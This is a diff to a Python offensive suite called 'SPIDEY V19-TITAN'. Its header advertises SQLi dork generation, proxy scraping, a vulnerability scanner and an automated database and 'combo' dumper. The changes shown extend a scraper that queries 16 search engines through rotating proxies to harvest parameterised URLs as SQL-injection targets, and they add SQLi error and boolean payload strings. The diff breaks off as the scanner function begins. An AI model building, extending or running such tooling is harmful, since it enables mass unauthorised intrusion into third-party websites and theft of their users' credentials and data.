@@ -2,14 +2,14 @@
 # -*- coding: utf-8 -*-
 """
 ================================================================================
-  SPIDEY V18-TITAN — STANDALONE OFFLINE & LOCAL SUITE (WEB GUI + CLI EDITION)
+  SPIDEY V19-TITAN — STANDALONE OFFLINE & LOCAL SUITE (WEB GUI + CLI EDITION)
   100% Independent of Telegram Bot API • Zero 50MB File Limit • PC / Laptop / VPS
   Modules Included End-to-End:
     [1] AI Target -> UHQ Keyword Maker (100% Offline Taxonomy + Optional Live Boost)
     [2] Keyword Quality Checker (Premium / Good / Normal / Bad + Split ZIP)
     [3] UHQ SQLi & High-Hit Dork Generator (Up to 5,000,000 Dorks Direct to Disk)
     [4] Multi-Source Proxy Scraper & Live SERP Validator
-    [5] Clean Multi-Process (`execve`) 18-Engine UHQ URL Parser + Live DOM Spider
+    [5] DEEP 18-Engine Multi-Page UHQ URL Parser (Competitor-Grade Telemetry + Live DOM Spider)
     [6] High-Speed SQLi Vulnerability Scanner (Error + Boolean + DBMS Fingerprint)
     [7] Automated UNION / Error SQLi Database & Combo Dumper (+ SQLMap Bridge)
     [8] Multi-Million Line Offline Refinery (Combos, Emails, ?param= URLs, Dedup)
@@ -48,7 +48,7 @@ from http import HTTPStatus
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
 
-SUITE_VERSION = "V18-TITAN OFFLINE SUITE"
+SUITE_VERSION = "V19-TITAN OFFLINE SUITE"
 BASE_DIR = Path(os.path.abspath(os.path.dirname(__file__)))
 WORK_DIR = BASE_DIR / "spidey_offline_workspace"
 SUBDIRS = (
@@ -98,40 +98,49 @@ def detect_hardware_specs() -> dict:
 
 HW_INFO = detect_hardware_specs()
 
+MIN_THREADS = 20          # Hard floor: HAR HAAL ME kam se kam 20 parallel threads!
+MAX_THREADS = 1600        # Hard ceiling for 100+ core monsters.
+
+
+def _thr(value: int, floor: int = MIN_THREADS) -> int:
+    return max(floor, min(MAX_THREADS, int(value)))
+
+
 HARDWARE_PROFILES = {
     "auto": {
         "label": f"⚡ Auto-Detect ({HW_INFO['cores']} Cores / {HW_INFO['ram_gb']} GB RAM)",
         "workers": max(2, min(12, HW_INFO["cores"])),
-        "parser_threads": max(24, min(160, HW_INFO["cores"] * 14)),
-        "sqli_threads": max(40, min(320, HW_INFO["cores"] * 26)),
-        "dump_threads": max(8, min(48, HW_INFO["cores"] * 4)),
+        # I/O-bound work: even a 1-core / 1 GB VPS easily runs 24+ threads.
+        "parser_threads": _thr(max(24, HW_INFO["cores"] * 16)),
+        "sqli_threads": _thr(max(30, HW_INFO["cores"] * 30)),
+        "dump_threads": _thr(max(10, HW_INFO["cores"] * 6), floor=10),
     },
     "low": {
-        "label": "🟢 Low (Laptop / 2-Core / 2–4 GB RAM)",
+        "label": "🟢 Lite (1–2 Core / 1–4 GB RAM Chota VPS)",
         "workers": 2,
         "parser_threads": 24,
-        "sqli_threads": 45,
-        "dump_threads": 8,
+        "sqli_threads": 30,
+        "dump_threads": 10,
     },
     "medium": {
-        "label": "🟡 Medium (4-Core PC / 8 GB RAM)",
+        "label": "🟡 Medium (2–4 Core / 4–8 GB RAM)",
         "workers": 4,
-        "parser_threads": 56,
-        "sqli_threads": 110,
+        "parser_threads": 48,
+        "sqli_threads": 80,
         "dump_threads": 16,
     },
     "high": {
-        "label": "🟠 High (8-Core PC / 16–32 GB RAM)",
+        "label": "🟠 High (6–8 Core / 12–32 GB RAM)",
         "workers": 8,
-        "parser_threads": 110,
-        "sqli_threads": 220,
+        "parser_threads": 96,
+        "sqli_threads": 180,
         "dump_threads": 32,
     },
     "beast": {
-        "label": "🔥 Beast (12+ Core / 62 GB RAM Dedicated VPS)",
+        "label": "🔥 Beast (12+ Core / 32–64 GB RAM Dedicated)",
         "workers": 12,
-        "parser_threads": 180,
-        "sqli_threads": 380,
+        "parser_threads": 160,
+        "sqli_threads": 320,
         "dump_threads": 48,
     },
 }
@@ -139,8 +148,11 @@ HARDWARE_PROFILES = {
 
 def load_settings() -> dict:
     default = {
-        "profile": "beast" if HW_INFO["ram_gb"] >= 30 else "auto",
-        "parser_mode": "balanced",  # blitz | balanced | deep
+        "profile": "auto",
+        "parser_mode": "balanced",   # blitz | balanced | deep
+        "thread_override": 0,        # 0 = Auto. Any value >= 20 forces that many threads.
+        "page_depth": 1,             # 1-3 SERP pages per engine (deep = more URLs per dork)
+        "max_per_domain": 400,       # domain diversity cap (0 = unlimited)
         "use_proxies": True,
         "online_autocomplete": False,
     }
@@ -148,7 +160,9 @@ def load_settings() -> dict:
         if SETTINGS_FILE.is_file():
             data = json.loads(SETTINGS_FILE.read_text(encoding="utf-8"))
             if isinstance(data, dict):
-                default.update(data)
+                for k, v in data.items():
+                    if k in default:
+                        default[k] = v
     except Exception:
         pass
     return default
@@ -156,18 +170,41 @@ def load_settings() -> dict:
 
 def save_settings(cfg: dict) -> dict:
     cur = load_settings()
-    cur.update(cfg)
-    SETTINGS_FILE.write_text(json.dumps(cur, indent=2), encoding="utf-8")
+    cur.update({k: v for k, v in cfg.items() if k in cur})
+    try:
+        SETTINGS_FILE.write_text(json.dumps(cur, indent=2), encoding="utf-8")
+    except Exception:
+        pass
     return cur
 
 
 def get_active_limits() -> dict:
     cfg = load_settings()
-    prof = HARDWARE_PROFILES.get(cfg.get("profile", "auto"), HARDWARE_PROFILES["auto"]).copy()
+    prof = dict(HARDWARE_PROFILES.get(cfg.get("profile", "auto"), HARDWARE_PROFILES["auto"]))
     prof["profile_key"] = cfg.get("profile", "auto")
+
+    # 🔥 MASTER THREAD OVERRIDE (never below 20 threads!)
+    try:
+        ov = int(cfg.get("thread_override") or 0)
+    except Exception:
+        ov = 0
+    if ov >= MIN_THREADS:
+        prof["parser_threads"] = _thr(ov)
+        prof["sqli_threads"] = _thr(ov)
+        prof["dump_threads"] = _thr(max(10, ov // 4), floor=10)
+        prof["thread_override"] = _thr(ov)
+    else:
+        prof["thread_override"] = 0
+        prof["parser_threads"] = _thr(prof["parser_threads"])
+        prof["sqli_threads"] = _thr(prof["sqli_threads"])
+
     prof["parser_mode"] = cfg.get("parser_mode", "balanced")
+    prof["page_depth"] = max(1, min(3, int(cfg.get("page_depth") or 1)))
+    prof["max_per_domain"] = max(0, int(cfg.get("max_per_domain") or 0))
     prof["use_proxies"] = bool(cfg.get("use_proxies", True))
     prof["online_autocomplete"] = bool(cfg.get("online_autocomplete", False))
+    prof["ram_gb"] = HW_INFO["ram_gb"]
+    prof["cores"] = HW_INFO["cores"]
     return prof
 
 
@@ -195,6 +232,7 @@ class JobState:
         self.last_outputs: list[dict] = []
         self.last_qc_summary: dict | None = None
         self.child_procs: list[subprocess.Popen] = []
+        self.telemetry: dict = {}
 
     def start(self, module_name: str, total: int = 100, reinit: bool = False) -> bool:
         with self.lock:
@@ -210,6 +248,7 @@ class JobState:
             self.total = max(1, int(total))
             self.hits = 0
             self.extra_stat = ""
+            self.telemetry = {}
             if not reinit or not self.started_at:
                 self.started_at = time.time()
                 self.last_outputs = []
@@ -238,6 +277,10 @@ class JobState:
                 self.phase = phase
             if extra is not None:
                 self.extra_stat = extra
+
+    def set_telemetry(self, **kw) -> None:
+        with self.lock:
+            self.telemetry.update(kw)
 
     def add_output(self, path: Path, label: str, line_count: int, next_action: str = "") -> None:
         rel = str(path.relative_to(WORK_DIR))
@@ -292,6 +335,7 @@ class JobState:
                 "logs": list(self.logs[-90:]),
                 "outputs": list(self.last_outputs),
                 "qc_summary": self.last_qc_summary,
+                "telemetry": dict(self.telemetry),
                 "limits": get_active_limits(),
                 "has_primp": HAS_PRIMP,
             }
@@ -850,20 +894,32 @@ def decode_bing_u(url_or_tok: str) -> str:
     return url_or_tok
 
 
-def is_clean_target_url(u: str) -> bool:
+def _strip_www(domain: str) -> str:
+    d = (domain or "").strip().lower()
+    return d[4:] if d.startswith("www.") else d
+
+
+def is_clean_target_url(u: str, allow_root: bool = False) -> bool:
+    """Strict junk filter. `allow_root=True` keeps bare domains/paths for the broad Deep Parser list."""
     try:
         p = urllib.parse.urlparse(u.strip())
         if p.scheme not in ("http", "https"):
             return False
-        dom = p.netloc.lower().split(":")[0].removeprefix("www.")
+        dom = _strip_www(p.netloc.lower().split(":")[0])
         if not dom or "." not in dom or len(dom) < 4:
+            return False
+        if not re.match(r"^[a-z0-9](?:[a-z0-9\-]*[a-z0-9])?(?:\.[a-z0-9\-]+)+$", dom):
+            return False
+        if dom.split(".")[-1] in ("local", "localhost", "invalid", "test", "example"):
             return False
         if any(s in dom for s in SKIP_DOMAINS):
             return False
         has_q = bool(p.query and "=" in p.query)
         if (not p.path or p.path == "/") and not has_q:
-            return False
+            return allow_root
         if p.path and JUNK_EXT_RE.search(p.path):
+            return False
+        if len(u) > 900:
             return False
         return True
     except Exception:
@@ -872,7 +928,7 @@ def is_clean_target_url(u: str) -> bool:
 
 def endpoint_signature(u: str) -> str:
     p = urllib.parse.urlparse(u)
-    dom = p.netloc.lower().removeprefix("www.")
+    dom = _strip_www(p.netloc.lower())
     keys = sorted(set(k.lower() for k, _ in urllib.parse.parse_qsl(p.query, keep_blank_values=True) if k.lower() not in TRACKING_PARAMS))
     return f"{dom}{p.path}|{'&'.join(keys)}"
 
@@ -902,98 +958,146 @@ def translate_dork_native(raw_dork: str, eng: str) -> str:
     return f"{script_tok or 'product.php'} {param_tok} {niche}"
 
 
-def extract_urls_from_serp(body: str, eng: str) -> list[str]:
+# ---- 16 LIVE SEARCH ENGINES (no paid API, zero proxy needed for the first 6!) ----
+SUITE_ENGINES = [
+    ("bing_rss", "https://www.bing.com/search"),
+    ("yahoo_us", "https://search.yahoo.com/search"),
+    ("mojeek_web", "https://www.mojeek.com/search"),
+    ("duckduckgo_lite", "https://lite.duckduckgo.com/lite/"),
+    ("bing_html", "https://www.bing.com/search"),
+    ("ecosia_web", "https://www.ecosia.org/search"),
+    ("yahoo_uk", "https://uk.search.yahoo.com/search"),
+    ("brave_web", "https://search.brave.com/search"),
+    ("yahoo_in", "https://in.search.yahoo.com/search"),
+    ("aol_web", "https://search.aol.com/aol/search"),
+    ("duckduckgo_html", "https://html.duckduckgo.com/html/"),
+    ("marginalia_web", "https://search.marginalia.nu/search"),
+    ("yahoo_ca", "https://ca.search.yahoo.com/search"),
+    ("google_web", "https://www.google.com/search"),
+    ("startpage_web", "https://www.startpage.com/sp/search"),
+    ("yahoo_au", "https://au.search.yahoo.com/search"),
+]
+
+SERP_BLOCK_SIGS = (
+    "unusual traffic", "are you a robot", "captcha", "verify you are human",
+    "detected unusual", "our systems have detected", "enable javascript and cookies",
+    "access denied", "request blocked", "too many requests", "rate limited",
+)
+
+
+def serp_is_blocked(body: str) -> bool:
+    if not body or len(body) < 400:
+        return True
+    low = body[:6000].lower()
+    return any(s in low for s in SERP_BLOCK_SIGS)
+
+
+def extract_raw_links(body: str, eng: str) -> list[str]:
+    """Extracts EVERY candidate result URL from a SERP page (before junk filtering) — this feeds `Raw URLs`."""
     if not body or len(body) < 50:
         return []
-    found: list[str] = []
+    out: list[str] = []
     seen: set[str] = set()
 
     def _add(raw_u: str) -> None:
-        u = raw_u.replace("&amp;", "&").strip().split("#", 1)[0]
+        u = _html_mod.unescape(raw_u).replace("&amp;", "&").strip().split("#", 1)[0]
+        if not u.startswith(("http://", "https://")):
+            return
+        if "%2F" in u and "uddg=" not in u:
+            try:
+                u = urllib.parse.unquote(u)
+            except Exception:
+                pass
         if "?" not in u:
             u = u.rstrip("/")
-        if u not in seen and is_clean_target_url(u):
+        if u and u not in seen and len(u) < 900:
             seen.add(u)
-            found.append(u)
+            out.append(u)
 
-    if eng == "bing_rss" or ("<rss" in body[:500].lower() and "<item>" in body[:5000].lower()):
+    low_head = body[:6000].lower()
+    if eng == "bing_rss" or ("<rss" in low_head and "<item>" in low_head):
         for lk in RSS_LINK_RE.findall(body):
             _add(urllib.parse.unquote(lk) if "%2F" in lk else lk)
-        if found:
-            return found
+        if out:
+            return out
 
+    raw_unesc = body.replace("&amp;", "&")
     for tok in BING_U_RE.findall(body):
         _add(decode_bing_u(tok))
     for ru in YAHOO_RU_RE.findall(body):
         _add(urllib.parse.unquote(ru))
-    for dg in DDG_UDDG_RE.findall(body.replace("&amp;", "&")):
+    for dg in DDG_UDDG_RE.findall(raw_unesc):
         _add(urllib.parse.unquote(dg))
-    for gq in GOOGLE_Q_RE.findall(body.replace("&amp;", "&")):
+    for gq in GOOGLE_Q_RE.findall(raw_unesc):
         _add(urllib.parse.unquote(gq))
     for h in HREF_RE.findall(body):
-        hc = h.replace("&amp;", "&").strip()
+        hc = _html_mod.unescape(h).replace("&amp;", "&").strip()
         if hc.startswith("http"):
             _add(decode_bing_u(hc))
-    return found
+    return out
 
 
-SUITE_ENGINES = [
-    ("bing_rss", "https://www.bing.com/search"),
-    ("yahoo_us", "https://search.yahoo.com/search"),
-    ("bing_html", "https://www.bing.com/search"),
-    ("yahoo_uk", "https://uk.search.yahoo.com/search"),
-    ("duckduckgo_html", "https://html.duckduckgo.com/html/"),
-    ("yahoo_ca", "https://ca.search.yahoo.com/search"),
-    ("brave_web", "https://search.brave.com/search"),
-    ("yahoo_au", "https://au.search.yahoo.com/search"),
-    ("aol_web", "https://search.aol.com/aol/search"),
-    ("yahoo_in", "https://in.search.yahoo.com/search"),
-    ("ecosia_web", "https://www.ecosia.org/search"),
-    ("mojeek_web", "https://www.mojeek.com/search"),
-    ("google_web", "https://www.google.com/search"),
-]
+def extract_urls_from_serp(body: str, eng: str) -> list[str]:
+    return [u for u in extract_raw_links(body, eng) if is_clean_target_url(u)]
 
 
-def query_single_serp_engine(eng_name: str, base_url: str, raw_dork: str, proxy: str = "") -> list[str]:
+def query_single_serp_engine(eng_name: str, base_url: str, raw_dork: str, proxy: str = "", page: int = 0) -> tuple[list[str], str]:
+    """Returns `(raw_links, status)` where status is `ok` | `err` | `blocked`."""
     q = translate_dork_native(raw_dork, eng_name)
     mock_base = os.environ.get("_SPIDEY_OFFLINE_MOCK_SERP", "")
-    if mock_base:
-        code, html = fast_http_fetch(f"{mock_base}/search", params={"eng": eng_name, "q": q}, proxy=proxy, timeout=3.0)
-        return extract_urls_from_serp(html, eng_name) if code == 200 else []
+    try:
+        if mock_base:
+            code, html = fast_http_fetch(f"{mock_base}/search", params={"eng": eng_name, "q": q, "page": page}, proxy=proxy, timeout=4.0)
+            if code != 200 or not html:
+                return [], "err"
+            return extract_raw_links(html, eng_name), "ok"
 
-    if eng_name == "bing_rss":
-        code, html = fast_http_fetch(base_url, params={"q": q, "format": "rss", "count": "50", "setlang": "en"}, proxy=proxy, timeout=4.2)
-    elif eng_name == "bing_html":
-        code, html = fast_http_fetch(base_url, params={"q": q, "count": "50", "setlang": "en"}, proxy=proxy, timeout=4.2)
-    elif eng_name.startswith("yahoo_"):
-        code, html = fast_http_fetch(base_url, params={"p": q, "n": "30", "ei": "UTF-8"}, proxy=proxy, timeout=4.2)
-    elif eng_name == "duckduckgo_html":
-        code, html = fast_http_fetch(base_url, post_data={"q": q, "kl": "us-en"}, proxy=proxy, timeout=4.2)
-    elif eng_name == "brave_web":
-        code, html = fast_http_fetch(base_url, params={"q": q, "source": "web"}, proxy=proxy, timeout=4.2)
-    elif eng_name == "aol_web":
-        code, html = fast_http_fetch(base_url, params={"q": q, "count": "20"}, proxy=proxy, timeout=4.2)
-    elif eng_name == "ecosia_web":
-        code, html = fast_http_fetch(base_url, params={"method": "index", "q": q}, proxy=proxy, timeout=4.2)
-    elif eng_name == "google_web":
-        code, html = fast_http_fetch(base_url, params={"q": q, "gbv": "1", "num": "20", "hl": "en"}, proxy=proxy, timeout=4.2)
-    else:
-        code, html = fast_http_fetch(base_url, params={"q": q}, proxy=proxy, timeout=4.2)
+        off10 = page * 10
+        if eng_name == "bing_rss":
+            code, html = fast_http_fetch(base_url, params={"q": q, "format": "rss", "count": "50", "first": off10 + 1, "setlang": "en"}, proxy=proxy, timeout=5.0)
+        elif eng_name == "bing_html":
+            code, html = fast_http_fetch(base_url, params={"q": q, "count": "50", "first": off10 + 1, "setlang": "en"}, proxy=proxy, timeout=5.0)
+        elif eng_name.startswith("yahoo_"):
+            code, html = fast_http_fetch(base_url, params={"p": q, "n": "30", "b": off10 + 1, "ei": "UTF-8"}, proxy=proxy, timeout=5.0)
+        elif eng_name == "duckduckgo_html":
+            code, html = fast_http_fetch(base_url, post_data={"q": q, "kl": "us-en", "s": off10 * 3}, proxy=proxy, timeout=5.0)
+        elif eng_name == "duckduckgo_lite":
+            code, html = fast_http_fetch(base_url, params={"q": q, "kl": "us-en", "s": off10 * 3}, proxy=proxy, timeout=5.0)
+        elif eng_name == "brave_web":
+            code, html = fast_http_fetch(base_url, params={"q": q, "source": "web", "offset": page}, proxy=proxy, timeout=5.0)
+        elif eng_name == "aol_web":
+            code, html = fast_http_fetch(base_url, params={"q": q, "b": off10 + 1}, proxy=proxy, timeout=5.0)
+        elif eng_name == "ecosia_web":
+            code, html = fast_http_fetch(base_url, params={"method": "index", "q": q, "p": page + 1}, proxy=proxy, timeout=5.0)
+        elif eng_name == "mojeek_web":
+            code, html = fast_http_fetch(base_url, params={"q": q, "s": off10}, proxy=proxy, timeout=5.0)
+        elif eng_name == "marginalia_web":
+            code, html = fast_http_fetch(base_url, params={"query": q, "s": off10}, proxy=proxy, timeout=5.0)
+        elif eng_name == "google_web":
+            code, html = fast_http_fetch(base_url, params={"q": q, "gbv": "1", "num": "20", "hl": "en", "start": off10}, proxy=proxy, timeout=5.0)
+        elif eng_name == "startpage_web":
+            code, html = fast_http_fetch(base_url, post_data={"query": q, "page": str(page + 1)}, proxy=proxy, timeout=5.0)
+        else:
+            code, html = fast_http_fetch(base_url, params={"q": q}, proxy=proxy, timeout=5.0)
+    except Exception:
+        return [], "err"
 
-    if code == 200 and html:
-        return extract_urls_from_serp(html, eng_name)
-    return []
+    if code != 200 or not html:
+        return [], "err"
+    if serp_is_blocked(html):
+        return [], "blocked"
+    return extract_raw_links(html, eng_name), "ok"
 
 
 def harvest_live_site_params(seed_url: str) -> list[str]:
     """Visits discovered website & extracts real live `<a href='...?id=...'>` and `<form>` parameter endpoints!"""
-    code, html = fast_http_fetch(seed_url, timeout=2.5)
+    code, html = fast_http_fetch(seed_url, timeout=3.0)
     if code != 200 or not html:
         return []
     out: list[str] = []
-    sub = html[:200_000]
+    sub = html[:250_000]
     for h in HREF_RE.findall(sub):
-        full = urllib.parse.urljoin(seed_url, h.replace("&amp;", "&").strip())
+        full = urllib.parse.urljoin(seed_url, _html_mod.unescape(h).replace("&amp;", "&").strip())
         if "?" in full and "=" in full and is_clean_target_url(full):
             out.append(full)
     for act, body in FORM_RE.findall(sub):
@@ -1006,96 +1110,226 @@ def harvest_live_site_params(seed_url: str) -> list[str]:
     return out
 
 
-def run_parser_engine_streaming(dorks: list[str]) -> tuple[list[str], list[str]]:
-    """Multi-threaded + Live Streaming Disk Writer: writes `UHQ_SQLi_Param_URLs` & `All_HQ_URLs` EVERY SECOND live to disk!"""
+class _BoundedDedup:
+    """RAM-safe exact-URL dedup: int hashes with a hard cap so a 1 GB VPS never OOMs."""
+
+    def __init__(self, cap: int) -> None:
+        self.cap = max(50_000, int(cap))
+        self.buf: set[int] = set()
+        self.overflows = 0
+
+    def is_new(self, u: str) -> bool:
+        h = hash(u) & 0x7FFFFFFF
+        if h in self.buf:
+            return False
+        if len(self.buf) >= self.cap:
+            self.overflows += 1
+            if self.overflows % 250_000 == 0:
+                self.buf.clear()  # soft reset keeps memory flat, never crashes
+            return True
+        self.buf.add(h)
+        return True
+
+
+def load_dork_list(source) -> list[str]:
+    """Loads dorks from a Path (streamed, bounded-RAM dedupe) or a list."""
+    seen: set[int] = set()
+    out: list[str] = []
+    for d in iter_source_lines(source):
+        h = hash(d) & 0x7FFFFFFF
+        if h in seen:
+            continue
+        seen.add(h)
+        out.append(d)
+        if len(out) >= 4_000_000:
+            break
+    return out
+
+
+def run_parser_engine_streaming(dorks) -> dict:
+    """DEEP COMPETITOR-GRADE PARSER: multi-page SERP fan-out + retries + live disk streaming + full telemetry.
+
+    Emits exactly the stats pro sellers show:
+      `Scanned dorks`, `Raw URLs`, `Unique URLs`, `Filtered`, `Errors`, `Retries`, `Threads`.
+    """
     lim = get_active_limits()
-    work_dorks = list(dict.fromkeys(d.strip() for d in dorks if d and d.strip()))
+    work_dorks = load_dork_list(dorks)
     total = len(work_dorks)
     proxies = load_saved_proxies() if lim["use_proxies"] else []
     qmode = lim["parser_mode"]
-    fanout = 2 if qmode == "blitz" else (5 if qmode == "deep" else 3)
+    page_depth = 1 if qmode == "blitz" else (2 if qmode == "balanced" else 3)
+    page_depth = max(page_depth, int(lim.get("page_depth") or 1)) if qmode == "deep" else page_depth
+    fanout = {"blitz": 2, "balanced": 4, "deep": 6}.get(qmode, 4)
+    sig_cap = {"blitz": 2, "balanced": 5, "deep": 14}.get(qmode, 5)
+    max_per_domain = int(lim.get("max_per_domain") or 0)
+    threads = _thr(lim["parser_threads"])
 
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
     param_file = WORK_DIR / "parsed_urls" / f"UHQ_SQLi_Param_URLs_{ts}.txt"
-    all_file = WORK_DIR / "parsed_urls" / f"All_HQ_URLs_{ts}.txt"
+    all_file = WORK_DIR / "parsed_urls" / f"Deep_Parser_All_URLs_{ts}.txt"
 
+    ram = HW_INFO["ram_gb"]
+    dedup = _BoundedDedup(3_000_000 if ram >= 12 else (1_200_000 if ram >= 4 else 350_000))
+
+    stats = {"scanned": 0, "raw": 0, "unique": 0, "filtered": 0, "errors": 0, "retries": 0, "param": 0, "threads": threads}
     sig_counts: dict[str, int] = {}
+    domain_counts: dict[str, int] = {}
     spidered_hosts: set[str] = set()
-    param_urls: list[str] = []
-    all_urls: list[str] = []
-    done_n = [0]
     lk = threading.Lock()
+    started = time.time()
 
-    param_fh = open(param_file, "w", encoding="utf-8", buffering=1)
-    all_fh = open(all_file, "w", encoding="utf-8", buffering=1)
+    param_fh = open(param_file, "w", encoding="utf-8", buffering=1024 * 512)
+    all_fh = open(all_file, "w", encoding="utf-8", buffering=1024 * 512)
 
-    def _record_url(u: str) -> str | None:
-        if not is_clean_target_url(u):
-            return None
-        sig = endpoint_signature(u)
-        has_p = "?" in u and "=" in u
-        to_spider = None
+    def _publish(force_phase: bool = False) -> None:
+        el = max(0.2, time.time() - started)
+        rate = stats["scanned"] / el
+        JOB.set_telemetry(
+            scanned=stats["scanned"],
+            total_dorks=total,
+            raw_urls=stats["raw"],
+            unique_urls=stats["unique"],
+            filtered=stats["filtered"],
+            errors=stats["errors"],
+            retries=stats["retries"],
+            threads=threads,
+            param_urls=stats["param"],
+        )
+        JOB.update(
+            done=stats["scanned"],
+            total=max(1, total),
+            hits=stats["param"],
+            phase=f"Deep Parser — Scanned {stats['scanned']:,}/{total:,} dorks @ {rate:,.1f} dorks/s",
+            extra=(
+                f"Raw: {stats['raw']:,} | Unique: {stats['unique']:,} | Filtered: {stats['filtered']:,} | "
+                f"Errors: {stats['errors']:,} | Retries: {stats['retries']:,} | Threads: {threads}"
+            ),
+        )
+
+    def _consume(urls: list[str]) -> None:
+        """Filters + dedups + streams every accepted URL straight to disk (0 RAM growth risk)."""
+        accept_all: list[str] = []
+        accept_param: list[str] = []
         with lk:
-            max_per_sig = 2 if has_p else 1
-            if sig_counts.get(sig, 0) >= max_per_sig:
-                return None
-            sig_counts[sig] = sig_counts.get(sig, 0) + 1
-            all_urls.append(u)
-            all_fh.write(u + "\n")
-            if has_p:
-                param_urls.append(u)
-                param_fh.write(u + "\n")
-            dom = urllib.parse.urlparse(u).netloc.lower()
-            if dom and dom not in spidered_hosts and len(spidered_hosts) < 25_000:
-                spidered_hosts.add(dom)
-                to_spider = u
-        return to_spider
+            for u in urls:
+                stats["raw"] += 1
+                if not is_clean_target_url(u, allow_root=True):
+                    stats["filtered"] += 1
+                    continue
+                dom = _strip_www(urllib.parse.urlparse(u).netloc.lower())
+                if max_per_domain and domain_counts.get(dom, 0) >= max_per_domain:
+                    stats["filtered"] += 1
+                    continue
+                if not dedup.is_new(u):
+                    stats["filtered"] += 1
+                    continue
+                has_p = "?" in u and "=" in u
+                if not has_p and qmode == "blitz":
+                    stats["filtered"] += 1
+                    continue
+                sig = endpoint_signature(u) if has_p else ""
+                if has_p and sig_counts.get(sig, 0) >= sig_cap:
+                    stats["filtered"] += 1
+                    continue
+                if has_p:
+                    sig_counts[sig] = sig_counts.get(sig, 0) + 1
+                domain_counts[dom] = domain_counts.get(dom, 0) + 1
+                stats["unique"] += 1
+                accept_all.append(u)
+                if has_p:
+                    accept_param.append(u)
+                    stats["param"] += 1
+                dict_cap = 900_000 if ram >= 4 else 250_000
+                if len(sig_counts) > dict_cap:
+                    sig_counts.clear()
+                if len(domain_counts) > dict_cap:
+                    domain_counts.clear()
+            if accept_all:
+                all_fh.write("\n".join(accept_all) + "\n")
+            if accept_param:
+                param_fh.write("\n".join(accept_param) + "\n")
 
     def _process_dork(idx_and_dork: tuple[int, str]) -> None:
         if JOB.stop_flag.is_set():
             return
         idx, dork = idx_and_dork
-        px = proxies[idx % len(proxies)] if proxies else ""
         spider_seeds: list[str] = []
-        for off in range(fanout):
+        for pg in range(page_depth):
             if JOB.stop_flag.is_set():
                 break
-            eng_name, eng_url = SUITE_ENGINES[(idx + off * 3) % len(SUITE_ENGINES)]
-            found = query_single_serp_engine(eng_name, eng_url, dork, proxy=px)
-            if not found and px:
-                found = query_single_serp_engine(eng_name, eng_url, dork, proxy="")
-            for u in found:
-                sd = _record_url(u)
-                if sd:
-                    spider_seeds.append(sd)
+            for off in range(fanout):
+                if JOB.stop_flag.is_set():
+                    break
+                eng_i = (idx * 3 + pg * 5 + off) % len(SUITE_ENGINES)
+                eng_name, eng_url = SUITE_ENGINES[eng_i]
+                px = proxies[(idx + off + pg) % len(proxies)] if proxies else ""
+                links, status = query_single_serp_engine(eng_name, eng_url, dork, proxy=px, page=pg)
 
-        for sd in spider_seeds[:4]:
+                if status != "ok":
+                    with lk:
+                        stats["errors"] += 1
+                        stats["retries"] += 1
+                    # 🔁 Auto-Retry on a DIFFERENT engine (direct, no proxy) — never lose a dork!
+                    eng2, url2 = SUITE_ENGINES[(eng_i + 7) % len(SUITE_ENGINES)]
+                    links, status = query_single_serp_engine(eng2, url2, dork, proxy="", page=pg)
+                    if status != "ok":
+                        continue
+
+                if links:
+                    _consume(links)
+                    for cand in links:
+                        if "?" in cand and "=" in cand and is_clean_target_url(cand):
+                            dom = urllib.parse.urlparse(cand).netloc.lower()
+                            if dom not in spidered_hosts and len(spidered_hosts) < 30_000:
+                                spidered_hosts.add(dom)
+                                spider_seeds.append(cand)
+                    if len(spider_seeds) >= 8:
+                        break
+            if len(spider_seeds) >= 8:
+                break
+
+        for sd in spider_seeds[:6]:
             if JOB.stop_flag.is_set():
                 break
-            for sub_u in harvest_live_site_params(sd):
-                _record_url(sub_u)
+            try:
+                subs = harvest_live_site_params(sd)
+            except Exception:
+                subs = []
+            if subs:
+                _consume(subs)
 
         with lk:
-            done_n[0] += 1
-            if done_n[0] % 5 == 0 or done_n[0] == total:
-                JOB.update(
-                    done=done_n[0],
-                    total=total,
-                    hits=len(param_urls),
-                    phase=f"Parsing SERPs + Live DOM Spider ({done_n[0]:,}/{total:,} dorks)",
-                    extra=f"Pure ?param= URLs: {len(param_urls):,} | Total HQ: {len(all_urls):,}",
-                )
+            stats["scanned"] += 1
+            if stats["scanned"] % 10 == 0 or stats["scanned"] == total:
+                _publish()
 
+    _publish()
     try:
-        with concurrent.futures.ThreadPoolExecutor(max_workers=lim["parser_threads"]) as ex:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
             list(ex.map(_process_dork, enumerate(work_dorks)))
     finally:
         param_fh.close()
         all_fh.close()
 
-    JOB.add_output(param_file, "Pure ?param= SQLi URLs", len(param_urls), next_action="sqli_scan")
-    JOB.add_output(all_file, "All Discovered HQ URLs", len(all_urls))
-    return param_urls, all_urls
+    stats["elapsed"] = round(time.time() - started, 1)
+    _publish()
+    param_n = stats["param"]
+    all_n = stats["unique"]
+    JOB.add_output(param_file, f"Pure ?param= SQLi URLs ({param_n:,})", param_n, next_action="sqli_scan")
+    JOB.add_output(all_file, f"Deep Parser — All Unique URLs ({all_n:,})", all_n)
+    JOB.log(
+        f"🌍 DEEP PARSER COMPLETE — Scanned: {stats['scanned']:,}/{total:,} dorks • Raw URLs: {stats['raw']:,} • "
+        f"Unique URLs: {stats['unique']:,} • Filtered: {stats['filtered']:,} • Errors: {stats['errors']:,} • "
+        f"Retries: {stats['retries']:,} • Threads: {threads} • Time: {stats['elapsed']}s"
+    )
+    return {
+        "stats": stats,
+        "param_file": param_file,
+        "all_file": all_file,
+        "param_count": param_n,
+        "all_count": all_n,
+        "param_urls": [],   # intentionally not held in RAM (disk-streamed)
+    }
 
 
 # ==============================================================================
@@ -1147,74 +1381,104 @@ def inject_param_value(url: str, param_idx: int, suffix: str, replace_val: str |
     return urllib.parse.urlunparse((p.scheme, p.netloc, p.path, p.params, urllib.parse.urlencode(pairs, safe="(),'/*+- "), p.fragment))
 
 
-def run_sqli_scanner(urls: list[str]) -> list[dict]:
+SQLI_ERROR_PAYLOADS = ("'", "\"", "'-- -", "')-- -", "' AND '1'='1", "1'", "1 AND 1=1")
+SQLI_BOOL_TRUE = (" AND 1=1-- -", " AND 1=1#", "' AND '1'='1")
+SQLI_BOOL_FALSE = (" AND 1=2-- -", " AND 1=2#", "' AND '1'='2")
+
+
+def run_sqli_scanner(urls) -> list[dict]:
+    """Multi-thread Error-Based + Boolean-Differential SQLi scanner. Accepts a list OR a Path (disk-streamed)."""
     lim = get_active_limits()
